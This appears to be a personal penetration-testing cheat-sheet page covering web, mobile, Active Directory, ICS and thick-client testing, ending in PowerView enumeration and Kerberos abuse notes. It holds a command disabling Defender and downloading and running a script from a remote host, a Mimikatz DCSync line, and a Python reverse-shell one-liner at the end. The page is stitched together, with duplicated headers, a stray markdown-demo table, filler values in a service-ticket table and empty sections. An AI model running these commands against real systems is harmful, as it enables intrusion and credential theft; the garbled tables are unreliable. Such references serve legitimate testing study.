---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# Brainbox – VAPT Checklist & Enumeration Flows

This page is my running VAPT brain dump: fast, repeatable flows for different target types.

---

---
layout: page
title: "Brainbox"
permalink: /brainbox/
---

<style>
.badge-red { background:#ffdddd; padding:2px 6px; border-radius:4px; }
.badge-yellow { background:#fff4cc; padding:2px 6px; border-radius:4px; }
.badge-green { background:#ddffdd; padding:2px 6px; border-radius:4px; }
.badge-blue { background:#ddeaff; padding:2px 6px; border-radius:4px; }
</style>

# Brainbox – VAPT Checklist & Enumeration Flows

Below are collapsible sections for quick navigation.

---

## Web Applications

<details>
<summary><strong>Web – Recon & Mapping</strong></summary>

- Subdomain enum <span class="badge-blue">Important</span>  
  `subfinder`, `amass`, `crt.sh`
- Content discovery  
  `ffuf`, `feroxbuster`
- JS file analysis <span class="badge-yellow">High‑value</span>

</details>

<details>
<summary><strong>Web – Auth & Session</strong></summary>

- Check login flows  
- Session cookie flags <span class="badge-red">Critical</span>  
- IDOR checks (horizontal/vertical)

</details>

<details>
<summary><strong>Web – Injection & Logic</strong></summary>

- XSS, SQLi, SSTI  
- Race conditions / TOCTOU <span class="badge-red">Critical</span>  
- Business logic bypasses

</details>

---

## Mobile Applications

<details>
<summary><strong>Mobile – Static Analysis</strong></summary>

- Decompile APK/IPA  
- Hardcoded secrets <span class="badge-red">Critical</span>  
- Exported activities / deep links

</details>

<details>
<summary><strong>Mobile – Dynamic Analysis</strong></summary>

- Burp proxy + cert pinning bypass  
- Frida hooks <span class="badge-blue">Useful</span>  
- Insecure storage checks

</details>

---

## Active Directory

### Without Creds

<details>
<summary><strong>AD – Without Creds</strong></summary>

- Kerberos user enum  
- AS‑REP roasting <span class="badge-red">Critical</span>  
- SMB share discovery  
- Password spraying (safe mode)

</details>

### With Creds

<details>
<summary><strong>AD – With Creds</strong></summary>

- BloodHound / SharpHound  
- Kerberoasting <span class="badge-red">Critical</span>  
- ACL abuse (GenericAll, WriteDACL)  
- Lateral movement (SMB, WMI, PSRemoting)

</details>

---

## ICS / OT

<details>
<summary><strong>ICS – Safe Enumeration</strong></summary>

- Passive only <span class="badge-yellow">Safety First</span>  
- Identify PLCs, HMIs  
- Remote access paths (VPN, TeamViewer)

</details>

---

## Thick Client

<details>
<summary><strong>Thick Client – Local & Network</strong></summary>

- Binary inspection  
- Hardcoded creds <span class="badge-red">Critical</span>  
- DLL hijacking  
- Traffic interception

</details>


============================================================





## Web applications

### 1. Recon & mapping

- **Passive recon:**  
  - Enumerate subdomains (crt.sh, certspotter, amass, subfinder)  
  - Check historical URLs (wayback, gau, katana)  
- **Tech stack fingerprinting:**  
  - Wappalyzer, headers, responses, JS files  
- **Content discovery:**  
  - `ffuf`, `dirsearch`, `feroxbuster` on common wordlists  
  - Look for `/admin`, `/api`, `/backup`, `/old`, `/test`

### 2. Authentication & session

- **Login surface:**  
  - Check for weak lockout, verbose errors, default creds  
- **Session handling:**  
  - Cookie flags (HttpOnly, Secure, SameSite)  
  - Session fixation, predictable tokens, JWT alg confusion / kid abuse  
- **Access control:**  
  - IDORs (numeric IDs, UUIDs, slugs)  
  - Horizontal/vertical privilege escalation via Burp “Compare” flows

### 3. Input & business logic

- **Classics:**  
  - XSS (reflected, stored, DOM)  
  - SQLi (error‑based, blind, time‑based)  
  - SSTI, command injection, XXE  
- **Logic flaws:**  
  - Bypass flows (coupon reuse, race conditions on balance/points, TOCTOU)  
  - Parameter tampering (price, role, flags)

### 4. APIs

- **Discovery:**  
  - Swagger/OpenAPI, `/v1/`, `/api/`, mobile app traffic  
- **Checks:**  
  - Auth on every endpoint  
  - Mass assignment, over‑permissive objects  
  - Insecure direct object references in JSON

---

## Mobile applications

### 1. Static analysis

- **APK/IPA extraction:**  
  - Decompile (jadx, apktool, mobSF)  
- **Code review targets:**  
  - Hardcoded secrets, API keys, URLs  
  - Insecure storage (SharedPreferences, SQLite, plist, NSUserDefaults)  
  - Exported activities/intents, deep links, custom schemes  
  - Root/jailbreak checks and bypass logic

### 2. Dynamic analysis

- **Proxying traffic:**  
  - Burp with cert pinning bypass (Frida, objection, patching)  
- **Runtime hooks:**  
  - Frida scripts for auth, crypto, and logic  
- **Mobile‑specific issues:**  
  - Insecure local storage  
  - Weak TLS config, cert pinning mistakes  
  - Intent hijacking, insecure broadcast receivers

---

## Active Directory

### Without creds

#### 1. Network & host discovery

- **Scope:**  
  - `nmap` for DCs, file servers, RDP, WinRM  
  - Identify domain via SMB, LDAP banners, Kerberos (`nmap --script=krb5-enum-users`)

#### 2. AD enumeration (unauth)

- **LDAP/Kerberos:**  
  - AS‑REP roasting (no‑preauth users)  
  - User enumeration via Kerberos responses  
- **SMB/NetBIOS:**  
  - Null sessions (if allowed)  
  - Share enumeration for world‑readable data  
- **Web & misc:**  
  - Password spraying against OWA/VPN/SSO with safe lockout strategy

#### 3. Initial access paths

- **Targets:**  
  - Weak external services (VPN, RDP, web apps)  
  - Misconfigured SMB shares with scripts/creds  
  - Phishing / payload delivery (if in scope)

---

### With creds

#### 1. Authenticated AD enumeration

- **User & group mapping:**  
  - `ldapsearch`, `BloodHound`, `SharpHound`  
  - Enumerate groups, GPOs, ACLs, sessions  
- **Host reachability:**  
  - `crackmapexec`, `smbclient`, `rpcclient`  
  - Check local admin access, open shares

#### 2. Privilege escalation paths

- **Common paths:**  
  - Kerberoasting (SPN accounts)  
  - AS‑REP roasting (if still present)  
  - ACL abuse (GenericAll, WriteDACL, WriteOwner)  
  - GPO abuse, vulnerable service paths  
- **Lateral movement:**  
  - Pass‑the‑hash, Pass‑the‑ticket (if allowed)  
  - PSRemoting, WMI, SMB exec

#### 3. Domain dominance

- **Objectives:**  
  - DC compromise, DCSync, KRBTGT abuse (if in scope)  
  - Golden/Silver tickets (lab/red team only, not standard VAPT unless agreed)

---

## ICS / OT environments

*(High‑caution, safety‑first, usually read‑only enumeration)*

### 1. Scoping & safety

- **Rules of engagement:**  
  - Confirm **no active scanning** on production unless explicitly allowed  
  - Prefer passive monitoring, span ports, logs  
- **Identify zones:**  
  - Corporate IT vs OT vs safety systems

### 2. Passive discovery

- **Protocols & assets:**  
  - Identify Modbus, DNP3, OPC, PROFINET, etc. via passive tools  
  - Map PLCs, HMIs, engineering workstations

### 3. Configuration & access

- **Checks:**  
  - Default creds on HMIs/engineering stations (if allowed)  
  - Remote access paths (TeamViewer, VPN, RDP)  
  - Backup/restore procedures and segregation

---

## Thick client applications

### 1. Recon & static analysis

- **Binary inspection:**  
  - Strings, dependencies, config files  
  - Look for hardcoded creds, endpoints, license keys  
- **Tech stack:**  
  - .NET (dnSpy), Java (JD‑GUI), Electron, etc.

### 2. Traffic & backend

- **Network:**  
  - Intercept traffic (Burp, mitmproxy)  
  - Check for TLS, cert validation, custom protocols  
- **Backend logic:**  
  - Replay/modify requests, test auth and authorization

### 3. Local attack surface

- **Storage:**  
  - Local DBs, config files, logs  
  - Insecure permissions, world‑readable secrets  
- **Process & IPC:**  
  - Named pipes, local APIs, COM objects  
  - DLL hijacking, weak update mechanisms

---

## Notes

This page is a living document. I update it as I refine my flows, tools, and priorities.


============================================================


# INFASTRUCTURE


# ACTIVE DIRECTORY


## DOMAIN ENUMERATION

I do prefer to do manual enumeration but on large enterprice networks, some automated scan would come in handy to search for low hanging fruits

Automated Scanners
AdPeas.ps1

You can aswell use BloodHound to visualize data

> checklist
check password policy
gather usernam -
Pray and Spray with CME 

```powershell
#For SharpHound.exe
./SharpHound.exe --CollectionMethod All

#For SharpHound.ps1
Invoke-BloodHound -ZipFileName ratloot -CollectionMethod All -Domain  rat.local

```
<span class="demo-highlight"># Patch AMSI or disable AV</span>

Getting hands dirty with PowerView
```powershell
      Set-MpPreference -DisableRealTimeMonitoring -DisableAVIOProtection $true
      iex(New-Object System.Net.WebClient).downloadString('http:/x.x.x.x./PowerView_DeV.ps1')
```
 <br>
 <span class="demo-highlight"># Domain & Controller Enumeration</span>

```powershell
Get-NetDomain 
            
Get-NetDomainController     
```
<br>
 <span class="demo-highlight"># User Enumeration</span>

```powershell
# Get all users present in the domain
Get-NetUsers | select cn

# Get users sorted with most logoncounts
Get-UserProperty -Properties logoncount | where logoncount | sort logoncount -Descending

# Get all the users in the domain and pipe their username to build a wordlist that could be used with crackmapexec later for spraying
Get-NetUsers | select samaccountname > username.txt

```
<br>
<span class="demo-highlight"># Group Enumeration </span>

```powershell
# Get AD groups data either all or of a user
Get-NetGroup [-Domain <target>] [-FullData] [-GroupName "*admin*"] [-Username 'user_name']

# Get Members of a group
Get-NetGroupMember [-GroupName 'group_name'] [-Recurse]	
```
<br>
<span class="demo-highlight"># Share Enumeration</span>

```powershell
# Find interesting shares
Invoke-ShareFinder -ExcludeStandard -ExcludeIPC -ExcludePrint	

```
<br>
<span class="demo-highlight"># GPO Enumeration</span>

```powershell
# List all GPOs in the domain
Get-NetGPO [-ComputerName <rat.domain>]	

#Find Interesting GPO
Get-NetGPOGroup

```
<br>
<span class="demo-highlight"># OU Enumeration</span>

```powershell
# Get all OU (Organisational Units) in the domain
Get-NetOU [-FullData]

# Get gplink of an OU to get GPOs applied to it
(Get-NetOU -Name 'test').gplink	

# Get GPO of a GPlink
Get-NetGPO -GPOName '{cadkfapsdfasdfaudvajkd}'

# Get GPO of an OU using gplink
((Get-NetOU -FullData <OU_NAME>).gplink -split "cn=" -split ",")[1] | Get-NetGPO
```
<br>
<span class="demo-highlight"># ACL Enumeration</span>

```powershell
# Find interesting ACL
Invoke-ACLScanner -ResolveGUIDS	

# Find interesting ACL owned by a certain user :rat:
Invoke-ACLScanner -ResolveGUIDS | ?{$_.IdentityReference -match 'rat'}	
```
<br>
<span class="demo-highlight"># Trust Enumeration</span>

```powershell
# Map all domain trust
Get-NetDomainTrust [-Domain <target>]

# Get all the domain of a forest
Get-NetForestDomain [-Forest <target>]	
```
<br>
<span class="demo-highlight"># Hunting Users and Sessions</span>

```powershell
# Get list of all machines where current user has local admin access
Find-LocalAdminAccess	

# Invoke-EnumerateLocalAdmin	
Find all admins on all computers

# Find machines where a domain admin has a session, checkaccess tells you if you also have access to that machine
Invoke-UserHunter [-GroupName <group_name>] [-CheckAccess]	

# Get list of active sessions on a computer
Get-NetSession [-ComputerName <comp_name>]	

# Get list of Users logged-on on a system
Get-LoggedOnLocal [-ComputerName <comp_name>]	
```

<br>
## Kerberos Attacks
<br>
<span class="demo-highlight"># working from linux with creds</span>


````powershell
# username : rat
# password : r@tty419
# domain : rodent.local
impacket-getTGT rodent.local/rat:'r@tty419'


# now import the ticket into memory
export KRB5CCNAME=/tmp/rat.ccache

# confirm the ticket in memory 
klist
````
<br>
<br>
<span class="demo-highlight"># working from windows with creds</span>
````powershell
# Using Rubeus

./Rubeus.exe asktgt 
````

<br>
using */altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm* in Rubeus you can ask for all the tickets
<br>
| Service Ticket   | Service Type | # Abuse funtino |
|--------------|:-----:|-----------:|
| CIFS         |Windows FileShare, PsExec |        739 |
| HOST         |PsRemoting, Scheduled Task | adcad |
| HTTP         |PsRemoting|$sess = New-PsSession -Computername DC01; Enter-PsSession -Session $sess |
| LDAP         |LDAP Ops, DCSync |Mimikatz > lsadump::dcsync /rat.local:$DC-IP /all /csv |
| RPCSS        |  1.99 |        739 |
| KRBTGT       |Golden Ticket |do anything lol,|
| HOST & RPCSS |WMI |  WMIEXEC|
| HOST & HTTP |WinRM |  WMIEXEC|



|                |ASCII                          |HTML                         |
|----------------|-------------------------------|-----------------------------|
|Single backticks|`'Isn't this fun?'`            |'Isn't this fun?'            |
|Quotes          |`"Isn't this fun?"`            |"Isn't this fun?"            |
|Dashes          |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash|
<br>


## RTF && SCF Weaponization

<br>
<br>
<br>

# MITM6 IPV6 Attack

<br>
<br>
<br>




```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
